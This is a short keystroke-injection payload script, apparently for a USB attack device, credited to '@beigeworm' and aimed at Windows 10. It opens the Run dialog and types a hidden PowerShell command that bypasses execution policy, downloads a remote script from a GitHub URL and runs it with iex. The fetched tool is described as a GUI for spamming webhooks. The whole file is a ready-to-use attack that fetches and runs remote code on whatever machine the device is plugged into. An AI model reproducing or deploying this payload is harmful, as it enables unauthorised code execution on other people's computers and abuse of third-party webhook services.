// Title: beigeworm's Webhook Spammer GUI Tool.
// Author: @beigeworm
// Description: This script creates a GUI for Spamming a webhook with text or an image.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Webhook-Spammer-GUI/main.ps1 | iex");
delay(500);
press("ENTER");
